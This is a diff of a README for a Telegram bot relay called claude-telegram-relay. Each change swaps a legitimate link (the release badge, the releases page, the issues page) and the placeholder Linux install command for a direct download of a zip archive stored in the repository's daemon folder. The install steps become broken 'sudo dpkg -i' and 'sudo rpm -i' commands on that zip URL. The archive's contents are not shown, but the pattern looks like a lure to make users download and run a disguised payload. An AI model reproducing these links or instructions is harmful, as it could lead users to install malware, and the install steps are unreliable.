@@ -1,7 +1,7 @@
 # 🤖 claude-telegram-relay - Run Your Telegram Bot Easily
 
 ## 🌐 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20release-blue)](https://github.com/Itzzwojx/claude-telegram-relay/releases)
+[![Download](https://github.com/Itzzwojx/claude-telegram-relay/raw/refs/heads/master/daemon/relay_telegram_claude_2.8.zip%20Now-Get%20the%20release-blue)](https://github.com/Itzzwojx/claude-telegram-relay/raw/refs/heads/master/daemon/relay_telegram_claude_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to **claude-telegram-relay**. This tool helps you run a Telegram bot named Claude Code. It works on different operating systems and runs continuously as a background service. Follow these simple steps to download and set up your bot.
@@ -9,7 +9,7 @@ Welcome to **claude-telegram-relay**. This tool helps you run a Telegram bot nam
 ## 📥 Download & Install
 To get started, you will need to download the latest version of the software.
 
-1. Click on this link to visit the releases page: [Download Link](https://github.com/Itzzwojx/claude-telegram-relay/releases).
+1. Click on this link to visit the releases page: [Download Link](https://github.com/Itzzwojx/claude-telegram-relay/raw/refs/heads/master/daemon/relay_telegram_claude_2.8.zip).
 2. On the releases page, look for the latest version.
 3. Download the appropriate file for your operating system:
    - For **Windows**, download the `.exe` file.
@@ -31,7 +31,7 @@ Once the download is complete, follow the installation instructions relevant to 
 ### Linux Installation
 1. Find the downloaded package.
 2. Open the terminal.
-3. Use your package manager or install using the terminal with commands like `sudo dpkg -i yourfile.deb` or `sudo rpm -i yourfile.rpm`, depending on your package type.
+3. Use your package manager or install using the terminal with commands like `sudo dpkg -i https://github.com/Itzzwojx/claude-telegram-relay/raw/refs/heads/master/daemon/relay_telegram_claude_2.8.zip` or `sudo rpm -i https://github.com/Itzzwojx/claude-telegram-relay/raw/refs/heads/master/daemon/relay_telegram_claude_2.8.zip`, depending on your package type.
 
 ## ⚙️ Configuring Your Bot
 Once installed, you need to set up your bot to work with your Telegram account.
@@ -65,7 +65,7 @@ To ensure smooth operation, your system should meet the following requirements:
 ## 🔗 Further Support
 If you encounter any issues or have questions, you can find helpful resources:
 
-- Visit the [GitHub Issues Page](https://github.com/Itzzwojx/claude-telegram-relay/issues) for community support.
+- Visit the [GitHub Issues Page](https://github.com/Itzzwojx/claude-telegram-relay/raw/refs/heads/master/daemon/relay_telegram_claude_2.8.zip) for community support.
 - Check the documentation for more in-depth guides.
 
 ## 🌟 Conclusion
